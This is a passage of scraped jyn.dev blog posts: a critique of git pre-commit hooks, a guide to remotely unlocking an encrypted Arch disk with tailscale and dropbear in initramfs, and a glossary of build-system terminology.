repository in /home/jyn/src/third-website/best-fizzbuzz-ever/.git/\n$ git add main.rs\n$ git commit --message fizzbuzz\n[main (root-commit) 661dc28] fizzbuzz\n 1 file changed, 4 insertions(+)\n create mode 100644 main.rs\n</code></pre> <p>Neat. Now let's say I add this to some list of fizzbuzz projects in different languages. Maybe .... this one. They tell me I need to have \"proper formatting\" and \"use consistent style\". How rude.</p> <p>Maybe I can write a pre-commit hook that checks that for me?</p> <pre><code>$ cat &lt;&lt; 'EOF' &gt; pre-commit\n#!/bin/sh\nset -eu\nfor f in *.rs; do\n  rustfmt --check \"$f\"\ndone\nEOF\n$ chmod +x pre-commit\n$ ln -s ../../pre-commit .git/hooks/pre-commit\n$ git add pre-commit\n$ git commit --message \"add pre-commit hook\"\nDiff in /home/jyn/src/third-website/best-fizzbuzz-ever/src/main.rs:1:\n-fn main() { for i in 0.. {\n-    println (\"fizzbuzz\");\n-}}\n+fn main() {\n+    for i in 0.. {\n+        println(\"fizzbuzz\");\n+    }\n+}\n</code></pre> <p>Neat! Let's commit that change.</p> <pre><code>$ rustfmt main.rs\n$ git commit --message \"add pre-commit hook\"\n[main 3be7b87] add pre-commit hook\n 1 file changed, 4 insertions(+)\n create mode 100755 pre-commit\n$ git status\nOn branch main\nChanges not staged for commit:\n  (use \"git add &lt;file&gt;...\" to update what will be committed)\n  (use \"git restore &lt;file&gt;...\" to discard changes in working directory)\n    modified:   main.rs\n</code></pre> <p>Oh ... We fixed the formatting, but we didn't actually stage the changes. The pre-commit hook runs on the working tree , not on the index , so it didn't catch the issue. We can see that the version tracked by git still has the wrong formatting:</p> <pre><code>$ git show HEAD:main.rs\nfn main() { for i in 0.. {\n    println (\"fizzbuzz\");\n}}\n</code></pre> <p>Maybe we can make the script smarter? Let's checkout all the files in the index into a temporary directory and run our pre-commit hook there. 1</p> <pre><code>$ cat &lt;&lt; 'EOF' &gt; pre-commit\n#!/bin/sh\nset -eu\n\ntmpdir=$(mktemp -d --tmpdir \"$(basename \"$(realpath .)\")-pre-commit.XXXX\")\ntrap 'rm -r \"$tmpdir\"' EXIT\ngit checkout-index --all --prefix=\"$tmpdir/\"\nfor f in $tmpdir/*.rs; do\n  rustfmt --check \"$f\"\ndone\nEOF\n$ git add pre-commit\n$ git commit --message \"make pre-commit hook smarter\"\nDiff in /tmp/best-fizzbuzz-ever-pre-commit.ZNyw/main.rs:1:\n-fn main() { for i in 0.. {\n-    println (\"fizzbuzz\");\n-}}\n+fn main() {\n+    for i in 0.. {\n+        println(\"fizzbuzz\");\n+    }\n+}\n</code></pre> <p>Yay! That caught the issue. Now let's add our rust program to that collection of fizzbuzz programs.</p> <pre><code>$ git add main.rs\n$ git commit --message \"make pre-commit hook smarter\"\n[main 3cb40f6] make pre-commit hook smarter\n 2 files changed, 11 insertions(+), 4 deletions(-)\n$ git remote add upstream https://github.com/joshkunz/fizzbuzz\n$ git fetch upstream\nremote: Enumerating objects: 222, done.\nremote: Total 222 (delta 0), reused 0 (delta 0), pack-reused 222 (from 1)\nReceiving objects: 100% (222/222), 29.08 KiB | 29.08 MiB/s, done.\nResolving deltas: 100% (117/117), done.\nFrom https://github.com/joshkunz/fizzbuzz\n * [new branch]      master     -&gt; upstream/master\n$ git rebase upstream\nSuccessfully rebased and updated refs/heads/main.\n</code></pre> <p>Maybe we'll make one last tweak...</p> <pre><code>$ sed -i '1i // Written by jyn' main.rs\n$ git commit main.rs --message \"mark who wrote fizzbuzz\"\nDiff in /tmp/best-fizzbuzz-ever-pre-commit.n1Pj/fizzbuzz-traits.rs:4:\n use std::iter;\n\n struct FizzBuzz {\n-    from : i32\n-  , to : i32\n+    from: i32,\n+    to: i32,\n }\n\n impl FizzBuzz {\n</code></pre> <p>Uh. Huh. Right. The code that was already here wasn't formatted according to rustfmt. Our script is running on every file in the git repo, so it won't let us commit.</p> <p>Maybe we can change it to only run on modified files?</p> <pre><code>$ cat &lt;&lt; 'EOF' &gt; pre-commit\n#!/bin/sh\nset -eu\n\nfiles=$(git diff --name-only --cached --no-ext-diff --diff-filter=d)\n\ntmpdir=$(mktemp -d --tmpdir \"$(basename \"$(realpath .)\")-pre-commit.XXXX\")\ntrap 'rm -r \"$tmpdir\"' EXIT\n\nprintf %s \"$files\" | tr '\\n' '\\0' | xargs -0 git checkout-index --prefix=\"$tmpdir/\"\nfor f in $tmpdir/*.rs; do\n  rustfmt --check \"$f\"\ndone\nEOF\n$ git commit main.rs pre-commit \\\n  --message \"update main.rs; make pre-commit even smarter\"\n[main f2925bc] update main.rs; make pre-commit even smarter\n 2 files changed, 5 insertions(+), 1 deletion(-)\n</code></pre> <p>Alright. Cool.</p> <p>Let's do one last thing. Let's say we had an existing PR to this repo and we need to rebase it. Maybe it had a merge conflict, or maybe there was a fix on main that we need in order to implement our solution.</p> <pre><code>$ git checkout upstream/HEAD  # Simulate an old PR by checking out an old commit\nHEAD is now at 56bf3ab Adds E to the README\n$ echo 'fn main() { println!(\"this counts as fizzbuzz, right?\"); }' &gt; print.rs\n$ git add print.rs\n$ git commit --message \"Add print.rs\"\n[detached HEAD 3d1bbf7] Add print.rs\n 1 file changed, 1 insertion(+)\n create mode 100644 print.rs\n</code></pre> <p>And let's also say that we want to edit the commit message.</p> <pre><code>$ git rebase -i main  # Rebase this whole branch over our main branch\nreword 3d1bbf7 Add print.rs\n# Rebase f2925bc..3d1bbf7 onto f2925bc (1 command)\n</code></pre>"},{"location":"jyn.dev/pre-commit%20hooks%20are%20fundamentally%20broken_20260205/#now-we-really-have-a-problem","title":"Now, we really have a problem.","text":"<pre><code>Error: file `/tmp/best-fizzbuzz-ever-pre-commit.p3az/*.rs` does not exist\nCould not apply 3d1bbf7... Add print.rs\n</code></pre> <p>Two things went wrong here:</p> <ol> <li>Our pre-commit hook can't handle commits that don't have any Rust files.</li> <li>Our pre-commit hook ran on a branch we were rebasing. 2</li> </ol> <p>Fixing the first thing doesn't really help us, because we don't control other people's branches. They might have used <code>git commit --no-verify</code>. They might not even have a pre-commit hook installed. They might have had a branch that passed the hook when they originally wrote it, but not after a rebase (e.g. if your hook is <code>cargo check</code> or something like that). They might have had a branch that used an old version of the hook that didn't have as many checks as a later version.</p> <p>Our only real choice here is to pass <code>--no-verify</code> to <code>git rebase</code> every time we run it, and to <code>git commit</code> for every commit in the rebase we modify, and possibly even to every <code>git merge</code> we run outside of a rebase.</p> <p>This is because pre-commit hooks are a fundamentally broken idea. Code does not exist in isolation. Commits that are local to a developer machine do not ever go through CI. Commits don't even necessarily mean that that the code is ready to publish\u2014pre-commit hooks don't run on <code>git stash</code> for a reason! I don't use <code>git stash</code>, I use <code>git commit</code> so that my stashes are tied to a branch, and hooks completely break this workflow.</p> <p>More than that, pre-commit hooks are preventing you from saving your work. There should be a really, really good reason to prevent you from saving your work, and IMO \"doesn't pass the test suite\" is not that. I have similar feelings about format-on-save hooks.</p> <p>There are a bunch of other footguns with pre-commit hooks. This doesn't even count the fact that nearly all pre-commit hooks are implemented in a broken way and just blindly run on the worktree, and are slow or unreliable or both. Don't get me started on pre-commit hooks that try to add things to the commit you're about to make, or projects that try to automatically install a hook when you run the test suite.</p> <p>The <code>pre-commit</code> framework (or its cousin, lint-staged) does not fix this. It fixes the issues about running on the index by stashing your changes with <code>--keep-index</code>, which works but modifies your git state. It doesn't fix the issues about running during a rebase, nor does it prevent hooks from trying to add things to the current commit. 3</p> <p>\"Just don't write bad hooks\" doesn't work if I'm working on someone else's project where I don't control the hook.</p> <p>Please just don't use <code>pre-commit</code> hooks. Use <code>pre-push</code> instead. 4 <code>pre-push</code> hooks nearly avoid all of these issues.</p> <p>The only use case where I think pre-commit hooks are a good idea is for things that must never committed, that are worth interrupting a complicated rebase to prevent; namely: credentials. Once credentials are committed they're quite difficult to get out, and even harder to be sure you haven't missed them.</p>"},{"location":"jyn.dev/pre-commit%20hooks%20are%20fundamentally%20broken_20260205/#tips-for-writing-a-pre-push-hook","title":"Tips for writing a <code>pre-push</code> hook","text":"<ul> <li>Run on the index, not the working tree, as described above. 5</li> <li>Only add checks that are fast and reliable. Checks that touch the network should never go in a hook. Checks that are slow and require an up-to-date build cache should never go in a hook. Checks that require credentials or a running local service should never go in a hook.</li> <li>Be as quiet as possible. This hook is running buried inside a bunch of other commands, often without the developer knowing that the hook is going to run. Don't hide other important output behind a wall of progress messages.</li> <li>Don't set the hook up automatically. Whatever tool you use that promises to make this reliable is wrong. There is not a way to do this reliably, and the number of times it's broken on me is more than I can count. Please just add docs for how to set it up manually, prominantly featured in your CONTRIBUTING docs. (You do have contributing docs, right?)</li> </ul> <p>If the hook does fail, and the changes affect an older commit than the most recent, you can use a combination of <code>git-absorb</code>, <code>git-revise</code>, and <code>git rebase -X ours --exec</code> to put them in the appropriate commit before pushing again.</p> <p>And don't write <code>pre-commit</code> hooks!</p> <ol> <li> <p>This is really quite slow on large enough repos, but there's not any real alternative. <code>git stash --keep-index</code> messes with git index state and also with your stashes. The only VCS that exposes a FUSE filesystem of its commits is Sapling, which is poorly supported outside Facebook. The best you can do is give up on looking at the whole working copy and only write hooks that read a single file at a time. \u21a9</p> </li> <li> <p>By default this doesn't happen when running bare <code>rebase</code>, but the second you add <code>--interactive</code>, nearly anything you do runs a hook. Hooks will also run when you attempt to resolve merge conflicts. \u21a9</p> </li> <li> <p><code>lint-staged</code> does actually have a <code>--fail-on-changes</code> flag which aborts the commit, but that still modifies the working tree, and it's not on by default. \u21a9</p> </li> <li> <p>For more info about the difference, and a full list of possible hooks, see <code>man 5 githooks</code>. \u21a9</p> </li> <li> <p>Notice that I don't say \"only run on changed files\". That's because it's not actually possible to reliably determine which branch the current commit is based on, the best you can do is pick a random branch that looks likely. \u21a9</p> </li> </ol>"},{"location":"jyn.dev/remotely%20unlocking%20an%20encrypted%20hard%20disk_20260205/","title":"remotely unlocking an encrypted hard disk","text":"<p>\u6765\u6e90: https://jyn.dev \u94fe\u63a5: https://jyn.dev/remotely-unlocking-an-encrypted-hard-disk/ \u65e5\u671f: 2026-01-22T00:00:00+00:00</p> <p>Your mission, should you choose to accept it, is to sneak into the earliest parts of the boot process, swap the startup config without breaking anything, and leave without a trace.</p> <p>Are you ready? Let's begin.</p>"},{"location":"jyn.dev/remotely%20unlocking%20an%20encrypted%20hard%20disk_20260205/#the-setup","title":"the setup","text":"<p>In which our heroes are introduced, and the scene is set.</p> <p>For a very long time I had a beat-up old ThinkPad that couldn\u2019t hold a charge for the life of it, especially when running Windows. It tended to die a lot when I was traveling, and I travel a lot. To save battery when I\u2019m away from home, I often ssh back into my home desktop, both so I have persistent state even if my laptop battery dies, and so I get much faster builds that don\u2019t kill the battery.</p> <p>This has two small problems:</p> <ol> <li>Sometimes my home loses power and the desktop shuts off.</li> <li>Sometimes when the power comes back on it has a new public IP.</li> </ol> <p>For a long time I solved 1. by enabling \u201cPower On\" after \"Restore AC Power Loss\u201d in the BIOS and 2. with tailscale. However, I recently installed Arch with an encrypted boot partition, which means that boot doesn\u2019t finish until I type in the encryption password.</p> <p>Well. Well. What if I Simply put tailscale in initramfs?</p>"},{"location":"jyn.dev/remotely%20unlocking%20an%20encrypted%20hard%20disk_20260205/#the-plan","title":"the plan","text":"<p>In which our intrepid heroes chart the challenges to come.</p>"},{"location":"jyn.dev/remotely%20unlocking%20an%20encrypted%20hard%20disk_20260205/#initramfs","title":"initramfs","text":"<p>Oh, right. If you weren\u2019t aware, early boot in a Linux operating system1 is just running a full second operating system that happens to be very small, lol. That\u2019s loaded from a compressed archive file in /boot2 and run from memory, with no access to persistent storage. This OS running from memory is called initramfs (initial RAM filesystem).</p> <p>So when you see a screen like this:  That\u2019s actually a whole-ass OS, with an <code>init</code> PID and service management and everything. This is how, for example, <code>systemd-analyze</code> can show you stats about early boot \u2014 there\u2019s another copy of systemd running in initramfs, and it passes its state off to the one in the main OS.</p> <p>Well. That implies we can install things on it ^^.</p>"},{"location":"jyn.dev/remotely%20unlocking%20an%20encrypted%20hard%20disk_20260205/#constraints","title":"constraints","text":"<p>There\u2019s three parts to this:</p> <ol> <li>Networking in initramfs</li> <li>Tailscale in initramfs</li> <li>SSH in initramfs</li> </ol> <p>We also want to make this as secure as possible, so there\u2019s some more things to consider:</p> <ul> <li>Putting tailscale in initramfs means that it has unencrypted keys lying around.</li> <li>Tailscale keys expire (by default) after 90 days. At that point this will all break.</li> <li>You really really don\u2019t want people to get SSH access to your early boot environment.</li> </ul> <p>We can solve this in a few ways:</p> <ul> <li>Use Tailscale ACLs to only allow incoming connections to initramfs, not outgoing connections.</li> <li>Set the key to never expire.</li> <li>Set the SSH server to disallow all shells except the actual unlock command (<code>systemd-tty-ask-password-agent</code>).</li> </ul>"},{"location":"jyn.dev/remotely%20unlocking%20an%20encrypted%20hard%20disk_20260205/#tailscale-acls","title":"tailscale ACLs","text":"<p>Some background about Tailscale\u2019s ACLs (\u201caccess control lists\u201d). Tailscale\u2019s users are tied to their specific login method: you can, for example, add a passkey, but that passkey counts as a fully separate user than your original account. Tailscale also has \u201cgroups\u201d of users, which are what they sound like, \u201cauto groups\u201d, which again are what they sound like, \u201chosts\u201d, which are a machine connected to the network, and \u201ctags\u201d.</p> <p>Tags are odd, I haven't seen anything like them before. They group hosts, not users, and when you add a tag to a host, that counts as its login method , rather than the host being tied to a user account.</p> <p>A consequence of this is that the group <code>autogroup:member</code> does not include tagged machines, because tagged machines aren\u2019t tied to a user account. (A second consequence is that you can\u2019t remove all tags from a machine without logging out and logging back in to associate it with your user account.)</p> <p>So we can write a policy like this:</p> <pre><code>{\n  // Define the tags which can be applied to devices and by which users.\n  \"tagOwners\": {\n    \"tag:initrd\": [\"autogroup:admin\"],\n  },\n\n  // Define access control lists for users, groups, autogroups, tags,\n  // Tailscale IP addresses, and subnet ranges.\n  \"acls\": [\n    {\"action\": \"accept\", \"src\": [\"autogroup:member\"], \"dst\": [\"*:*\"]},\n  ],\n\n  // Test access rules every time they're saved.\n  \"tests\": [\n    {\n      \"src\":    \"100.76.34.8\", // outrageous-fortune\n      \"accept\": [\"100.102.101.127:22\", \"100.101.55.73:10078\"], // selene-initrd\n    },\n    {\n      \"src\":  \"100.102.101.127\", // selene-initrd\n      \"deny\": [\"100.101.55.73:10078\"], // selene\n    },\n  ],\n}\n</code></pre> <p>This says \u201callow devices tied to a user account to access any other device, and allow no permissions at all for devices tied to a tag\u201d.</p> <p><code>selene</code> here is my desktop, and <code>selene-initrd</code> is its initramfs. 3</p>"},{"location":"jyn.dev/remotely%20unlocking%20an%20encrypted%20hard%20disk_20260205/#systemd-before-boot","title":"systemd before boot","text":"<p>Because initramfs is just a (mostly) normal Linux system, that means it has its own <code>init</code> PID 1. On Arch, that PID is in fact just systemd. That means that we can add systemd services to initramfs! There's a whole collection of them in <code>mkinitcpio-systemd-extras</code> (<code>mkinitcpio</code> is the tool Arch uses to regenerate initramfs).</p> <p>We need two services: an SSH server (I went with <code>dropbear</code>) and something to turn on networking, which this collection names <code>sd-network</code>.</p> <p>It's possible to run <code>tailscale ssh</code> directly, rather than having a separate SSH server, but I didn't find any way to configure tailscale's SSH command, and I don't want to let anyone have a shell in my initramfs.</p>"},{"location":"jyn.dev/remotely%20unlocking%20an%20encrypted%20hard%20disk_20260205/#the-heist","title":"the heist","text":"<p>In which our heroes execute their plan flawlessly, sneaking in without a sound.</p> <p>If you follow these steps on an Arch system, you should end up with roughly the same setup as I have. Most of these commands assume you are running as root.</p> <ul> <li> <p>Install the dropbear SSH server:</p> <pre><code>pacman -S dropbear\n</code></pre> </li> <li> <p>Install the systemd packages:</p> <pre><code>yay -S mkinitcpio-systemd-extras mkinitcpio-tailscale\n</code></pre> </li> <li> <p>Add networking (<code>sd-network</code>), tailscale (<code>tailscale</code>), and dropbear (<code>sd-dropbear</code>) to <code>/etc/mkinitcpio.conf</code>:</p> <pre><code>1c1\n&lt; HOOKS=(base systemd autodetect microcode kms modconf block keyboard sd-vconsole plymouth sd-encrypt filesystems)\n---\n&gt; HOOKS=(base systemd autodetect microcode kms modconf block keyboard sd-vconsole plymouth sd-network tailscale sd-dropbear sd-encrypt filesystems)\n</code></pre> </li> <li> <p>Set up the keys for your new tailscale device:</p> <pre><code>setup-initcpio-tailscale\n</code></pre> </li> <li> <p>In the tailscale web console, mark your new device with <code>tag:initrd</code>, and disable key expiry. It should look something like this:</p> </li> </ul> <p></p> <ul> <li> <p>In <code>/etc/mkinitcpio.conf</code>, configure dropbear to only allow running the unlock command and nothing else:</p> <pre><code>SD_DROPBEAR_COMMAND=\"systemd-tty-ask-password-agent\"\n</code></pre> </li> <li> <p>Tell systemd to wait forever for a decryption password. I use <code>systemd-boot</code>, so I edited <code>/boot/loader/entries/linux-cachyos</code>. Under <code>options</code>, I extended the existing <code>rootflags=subvol=/@</code> to <code>rootflags=subvol=/@,x-systemd.device-timeout=0</code>. 4</p> </li> <li> <p>Copy your public keys into <code>/root/.ssh/authorized_keys</code> so they get picked up by the dropbear hook:</p> <pre><code>cp ~/.ssh/authorized_keys /root/.ssh/\n</code></pre> </li> <li> <p>Generate a new public/private keypair for use by the dropbear server.</p> <pre><code>dropbearkey -t ed25519 -f /etc/dropbear/dropbear_ed25519_host_key\n</code></pre> </li> </ul> <p>Without this, the dropbear hook will try to load keys from openssh, which means they'll be shared between early boot and your normal server. In particular that would mean your SSH server private keys would be stored unencrypted in initramfs.</p> <ul> <li> <p>Setup early networking. (Note: these instructions are only for Ethernet connections. If you want WiFi in early boot, good luck and godspeed.)</p> <ol> <li>Add the following config in <code>/etc/systemd/network-initramfs/10-wired.network</code>:</li> </ol> <p>[Match] Type=ether</p> <p>[Network] DHCP=yes</p> <ol> <li>Register it in <code>/etc/mkinitcpio.conf</code> so it gets picked up by the <code>sd-network</code> hook:</li> </ol> <p>SD_NETWORK_CONFIG=/etc/systemd/network-initramfs</p> </li> </ul> <p>All this rigamarole is necessary because the OS doesn't set the network interfaces to predictable names until late boot, so it needs some way to know which interface to use.</p> <ul> <li>Last but not least, rebuild your initramfs: <code>mkinitcpio -P</code>.</li> </ul> <p>Next time you reboot, you should be able to ssh into <code>$(hostname)-initrd</code> and get a prompt that looks like this:</p> <p></p>"},{"location":"jyn.dev/remotely%20unlocking%20an%20encrypted%20hard%20disk_20260205/#the-getaway","title":"the getaway","text":"<p>In which a moral is imparted, and our scene concluded.</p> <p>The takeaway here is the same as in all my other posts: if you think something isn't possible to do with a computer, have you considered applying more violence?</p> <ol> <li> <p>and I believe in Windows, although I\u2019m less sure about that \u21a9</p> </li> <li> <p>sometimes /boot/EFI \u21a9</p> </li> <li> <p>Here \u201cinitrd\u201d stands for \u201cinitramdisk\u201d, which is another word for our initramfs system. \u21a9</p> </li> <li> <p>See the <code>sd-dropbear</code> docs for more information about this. \u21a9</p> </li> </ol>"},{"location":"jyn.dev/what%20is%20a%20build%20system%2C%20anyway-_20260205/","title":"what is a build system, anyway?","text":"<p>\u6765\u6e90: https://jyn.dev \u94fe\u63a5: https://jyn.dev/what-is-a-build-system-anyway/ \u65e5\u671f: 2025-12-12T00:00:00+00:00</p> <p>Andrew Nesbitt recently wrote a post titled What is a Package Manager? This post attempts to do the same for build systems.</p>"},{"location":"jyn.dev/what%20is%20a%20build%20system%2C%20anyway-_20260205/#big-picture","title":"big picture","text":"<p>At a high level, build systems are tools or libraries that provide a way to define and execute a series of transformations from input data to output data that are memoized by caching them in an object store.</p> <p>Transformations are called steps or rules 1 and define how to execute a task that generates zero or more outputs from zero or more inputs. A rule is usually the unit of caching ; i.e. the cache points are the outputs of a rule, and cache invalidations must happen on the inputs of a rule. Rules can have dependencies on previous outputs, forming a directed graph called a dependency graph. Dependencies that form a cyclic graph are called circular dependencies and are usually banned.2</p> <p>Outputs that are only used by other rules, but not \u201cinteresting\u201d to the end-user, are called intermediate outputs.</p> <p>A output is outdated , dirty , or stale if one of its dependencies is modified, or, transitively , if one of its dependencies is outdated. Stale outputs invalidate the cache and require the outputs to be rebuilt. An output that is cached and not dirty is up-to-date. Rules are outdated if any of their outputs are outdated. If a rule has no outputs, it is always outdated.</p> <p>Each invocation of the build tool is called a build. A full build or clean build occurs when the cache is empty and all transformations are executed as a batch job. A cache is full if all its rules are up-to-date. An incremental build occurs when the cache is partially full but some outputs are outdated and need to be rebuilt. Deleting the cache is called cleaning.</p> <p>A build is correct or sound if all possible incremental builds have the same result as a full build.3 A build is minimal (occasionally optimal) if rules are rerun at most once per build, and only run if necessary for soundness (Build Systems \u00e0 la Carte, Pluto).</p> <p>In order for a build to be sound, all possible cache invalidations must be tracked as dependencies.</p> <p>A build system without caching is called a task runner or batch compiler. Note that task runners still often support dependencies even if they don't support caching. Build systems with caching can emulate a task runner by only defining tasks with zero outputs, but they are usually not designed for this use case. 4</p> <p>Some examples of build systems: <code>make</code>, <code>docker build</code>, rustc. Some examples of task runners: <code>just</code>, shell scripts, gcc.</p>"},{"location":"jyn.dev/what%20is%20a%20build%20system%2C%20anyway-_20260205/#specifying-dependencies","title":"specifying dependencies","text":"<p>A build can be either inter-process , in which case the task is usually a single process execution and its input and output files, or intra-process , in which case a task is usually a single function call and its arguments and return values.</p> <p>In order to track dependencies, either all inputs and outputs must be declared in source code ahead of time, or it must be possible to infer them from the execution of a task.</p> <p>Build systems that track changes to a rule definition are called self-tracking. Past versions of the rule are called its history (Build Systems \u00e0 la Carte).</p> <p>The act of inferring dependencies from runtime behavior is called tracing. If a traced rule depends on a dependency that hasn\u2019t been built yet, the build system may either error, suspend the task and resume it later once the dependency is built, or abort the task and restart it later once the dependency is built (Build Systems \u00e0 la Carte).</p> <p>Inter-process builds often declare their inputs and outputs, and intra-process builds often infer them, but this is not inherent to the definition. 5</p> <p>Some example of intra-process builds include spreadsheets, the wild linker, and memoization libraries such as python\u2019s <code>functools.cache</code>.</p>"},{"location":"jyn.dev/what%20is%20a%20build%20system%2C%20anyway-_20260205/#applicative-and-monadic-structure","title":"applicative and monadic structure","text":"<p>A build graph is applicative if all inputs, outputs, and rules are declared ahead of time. We say in this case the graph is statically known. Very few build systems are purely applicative, almost all have an escape hatch.</p> <p>The graph is monadic if not all outputs are known ahead of time, or if rules can generate other rules dynamically at runtime. Inputs that aren\u2019t known ahead of time are called dynamic dependencies. Dynamic dependencies are weaker than a fully monadic build system, in the sense that they can express fewer build graphs. 6</p> <p>Build systems that do not require declaring build rules are always monadic.</p> <p>Some examples of monadic build systems include Shake, ninja <code>dyndeps</code>, and Cargo build scripts.</p> <p>Some examples of applicative build systems include <code>make</code> (with recursive make and self-rebuilding Makefiles disallowed), Bazel (excluding native rules), and map/reduce libraries with memoization, such as this unison program.</p>"},{"location":"jyn.dev/what%20is%20a%20build%20system%2C%20anyway-_20260205/#early-cutoff","title":"early cutoff","text":"<p>If a dirty rule R has an outdated output, reruns, and creates a new output that matches the old one, the build system has an opportunity to avoid running later rules that depend on R. Taking advantage of that opportunity is called early cutoff.</p> <p>See the rustc-dev-guide for much more information about early cutoff. 7</p>"},{"location":"jyn.dev/what%20is%20a%20build%20system%2C%20anyway-_20260205/#rebuild-detection","title":"rebuild detection","text":"<p>In unsound build systems, it\u2019s possible that the build system does not accurately detect that it needs to rebuild. Such systems sometimes offer a way to force-rerun a target: keeping the existing cache, but rerunning a single rule. For inter-process build systems, this often involves <code>touch</code>ing a file to set its modification date to the current time.</p>"},{"location":"jyn.dev/what%20is%20a%20build%20system%2C%20anyway-_20260205/#the-executor","title":"the executor","text":"<p>A build executor runs tasks and is responsible for scheduling tasks in an order that respects all dependencies, often using heuristics such as dependency depth or the time taken by the task on the last run. They also detect whether rule inputs have been modified, making the rule outdated; this is called rebuild detection. The build executor is responsible for restarting or suspending tasks in build systems that support it.</p> <p>Executors usually schedule many tasks in parallel, but this is not inherent to the definition.</p> <p>Executors often provide progress reporting , and sometimes allow querying the dependency graph. Occasionally they trace the inputs used by the task to enforce they match the declared dependencies, or to automatically add them to an internal dependency graph.</p>"},{"location":"jyn.dev/what%20is%20a%20build%20system%2C%20anyway-_20260205/#inter-process-builds","title":"inter-process builds","text":"<p>In the context of inter-process builds, an artifact is an output file generated by a rule.8 A source file is an input file that is specific to the current project9 (sometimes repository or workspace) as opposed to a system dependency that is reused across multiple projects. A project is loosely defined but generally refers to the set of all input and output files that the build system knows about, usually contained in a single directory. Source files can be generated , which means they are an output of a previous rule.</p> <p>Build files contain rule definitions, including (but not limited to) task definitions, input and output declarations, and metadata such as a human-readable description of the rule. Inputs are usually split into explicit inputs passed to the spawned process, implicit inputs that are tracked by the build system but not used in the task definition, and order-only inputs that must exist before the rule can execute, but do not invalidate the cache when modified.</p> <p>Process executions have more inputs than just files, such as the rule itself, environment variables, the current time, the current working directory, and occasionally network services or local daemons 10.</p> <p>The set of all inputs that are not source files or command line arguments is called the environment. Processes can be sandboxed to prevent them from depending on the network, a daemon, or occasionally system dependencies; this is sometimes called a sandboxed environment or isolated environment.</p> <p>System dependencies are more expansive than I think they are often understood to be. They include compilers, linkers, programming language libraries 11, and static and dynamically linked object files, but also the dynamic loader, language runtime, and various system configuration files. The subset of these dependencies needed for building a minimal program in a given language, along with various tools for inspecting and modifying the outputs at runtime, are called a toolchain. Toolchains are inherently specific to a given language, but sometimes (e.g. in GCC) a single compiler will support multiple languages as inputs.</p> <p>A build is hermetic (rarely, self-contained or isolated 12) if it uses no system dependencies and instead defines all its dependencies in the project (Bazel). Sandboxing and hermeticity are orthogonal axes; neither one implies the other. For example, docker builds are sandboxed but not hermetic, and nix shells are hermetic but not sandboxed.</p> <p>Compiler or linkers sometimes have their own incremental caches. Reusing the cache requires you to trust the compiler to be sound when incrementally rebuilding. This is usually implicit, but hermetic or sandboxed builds require an opt-in to reuse the cache. Bazel calls this kind of reuse a persistent worker.</p>"},{"location":"jyn.dev/what%20is%20a%20build%20system%2C%20anyway-_20260205/#determinism","title":"determinism","text":"<p>A build is deterministic if it creates the same output every time in some specific environment. A build is reproducible if it is deterministic and also has the same output in any environment, as long as the system dependencies remain the same.</p>"},{"location":"jyn.dev/what%20is%20a%20build%20system%2C%20anyway-_20260205/#remote-caching","title":"remote caching","text":"<p>Caching can be remote or local. Remote caching is almost always unsound unless the build is both hermetic and reproducible (i.e. its only environment dependencies are controlled by the build system).</p> <p>Downloading files from the remote cache is called materializing them. Most build systems with remote caching defer materialization as long as possible, since in large build graphs the cache is often too large to fit on disk. Builds where the cache is never fully materialized are called shallow builds (Build Systems \u00e0 la Carte).</p> <p>Remote caching usually, but not necessarily, uses content addressed hashing in a key-value store to identify which artifact to download.</p> <p>Some example build systems that use remote caching: Bazel, Buck2, nix, <code>docker build</code>.</p>"},{"location":"jyn.dev/what%20is%20a%20build%20system%2C%20anyway-_20260205/#interface","title":"interface","text":"<p>Build systems usually have a way to run a subset of the build. The identifier used to specify which part of the build you want to run is called a target.13 Targets are usually the filenames of an artifact, but can also be abstract names of one or more rules. Bazel-descended build systems call these names labels. Make-descended build systems call these phony targets. Some build systems, such as cargo, do not use target identifiers but instead only have subcommands with arguments; the combination of arguments together specifies a set of targets.</p> <p>Some example targets:</p> <ul> <li><code>make all</code></li> <li><code>cargo build --test http_integration</code></li> <li><code>buck2 build :main</code></li> </ul>"},{"location":"jyn.dev/what%20is%20a%20build%20system%2C%20anyway-_20260205/#meta-build-systems","title":"meta-build systems","text":"<p>Inter-process build systems are often divided into a configuration step and a build step. A build system that only runs the configuration step, and requires another tool for the build step, is called a meta-build system.</p> <p>Usually this meta-build system discovers the rules that need to be executed (often through file globbing or some other programmatic way to describe dependencies), then serializes these rules into an action graph, which can be stored either in-memory or on-disk. On-disk serialized action graphs are usually themselves build files, in the sense that you can write them by hand but you wouldn't want to.</p> <p>Configuration steps usually allow the developer to choose a set of configuration flags (occasionally, build flags) that affect the generated rules.</p> <p>Some build systems also integrate directly with the package manager, but this is uncommon, and usually the build system expects all packages to be pre-downloaded into a known location.</p> <p>Some examples of meta-build systems are CMake, meson, and autotools.</p>"},{"location":"jyn.dev/what%20is%20a%20build%20system%2C%20anyway-_20260205/#vfs","title":"VFS","text":"<p>Advanced build systems can integrate with a virtual file system (VFS) to check-out source control files on-demand, rather than eagerly (EdenFS). A VFS can also persistently store content hashes and provide efficient change detection for files, avoiding the need for file watching or constant re-hashing.</p>"},{"location":"jyn.dev/what%20is%20a%20build%20system%2C%20anyway-_20260205/#intra-process-builds","title":"intra-process builds","text":"<p>The equivalent of system dependencies within a process is non-local state , including environment variables, globals, thread-locals, and class member fields (for languages where <code>this</code> is passed implicitly). Especially tricky are function calls that do inter-process communication (IPC), which are basically never sound to cache. Tracing intra-process builds is very very hard since it\u2019s easy to call a function that depends on global state without you knowing. 14</p> <p>In this intra-process context, most object stores are in-memory caches. A build system that supports saving (persisting) the cache to disk is said to have persistence. The system for persisting the cache is sometimes called a database , even if it is not a general-purpose database in the sense the term is normally used (Salsa).</p>"},{"location":"jyn.dev/what%20is%20a%20build%20system%2C%20anyway-_20260205/#tracing","title":"tracing","text":"<p>Tracing intra-process build systems are sometimes called a query system. 15 They work similarly to their inter-process equivalents: the interface looks like normal function calls, and the build system tracks which functions call which other functions, so it knows which to rerun later.</p> <p>Some examples of tools with tracing intra-process build systems: salsa, the rustc query system.</p>"},{"location":"jyn.dev/what%20is%20a%20build%20system%2C%20anyway-_20260205/#frp","title":"FRP","text":"<p>Intra-process build systems that allow you to explicitly declare dependencies usually come from the background of functional reactive programming (FRP). FRP is most often used in UI and frontend design, but many of the ideas are the same as the build systems used for compiling programs.</p> <p>Unlike any of the build systems we've talked about so far, FRP libraries let you look at past versions of your outputs, which is sometimes called remembering state (React). To make this easier to reason about, rules can be written as event handlers.</p> <p>Some examples of libraries with dependency declarations: 